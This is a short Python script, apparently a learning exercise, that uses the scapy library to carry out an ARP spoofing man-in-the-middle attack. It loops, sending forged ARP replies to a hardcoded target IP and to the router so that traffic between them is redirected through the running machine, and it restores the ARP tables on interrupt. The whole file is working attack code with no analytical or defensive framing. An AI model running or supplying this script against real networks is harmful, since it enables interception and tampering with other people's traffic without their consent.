#!/usr/bin/python3


import scapy.all as scapy
import time
#import sys

#macking change on router machine
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, verbose=False)
    pass


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    (answered, unanswered) = scapy.srp(arp_request_broadcast, timeout=1, verbose=False) # srp allow to send custom ether part
    #print(answered[0])
    return answered[0][1].hwsrc
    

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip)
    scapy.send(packet, count=4, verbose=False)
    pass



#get_mac("172.17.0.3")
target_ip = "192.168.18.66"
router_ip = "192.168.18.1"
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, router_ip)
        sent_packets_count +=1
        spoof(router_ip, target_ip)
        sent_packets_count +=1
        print("\r[+] sent two packets: " + str(sent_packets_count), end="")
        #sys.stdout.flush()
        time.sleep(2)
        pass
except KeyboardInterrupt:
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    print("\n[+] Detected Ctrl + C Resetting ARP tables... Please wait.\n")
